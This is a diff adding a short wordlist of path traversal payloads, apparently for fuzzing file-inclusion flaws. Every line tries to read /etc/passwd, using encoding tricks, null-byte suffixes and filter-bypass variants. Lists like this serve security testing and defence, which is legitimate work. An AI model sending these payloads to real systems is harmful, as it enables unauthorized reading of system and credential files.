@@ -1,0 +1,16 @@
+../../../etc/passwd
+../../../../../etc/passwd                                                                                               
+../../../../../etc/passwd%00
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2f/etc/passwd
+/etc/passwd
+/\etc/\passwd
+../\../\../\../\etc\passwd
+....//....//....//etc//passwd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c0%af..%c0%af..%c0%af/etc/passwd
+....\/....\/....\/etc/passwd
+/var/www/images/../../../etc/passwd
+../../../../etc/passwd%00.png
+..%252f..%252f..%252fetc%c0%afpasswd
+..%252f..%252f..%252f/etc/passwd
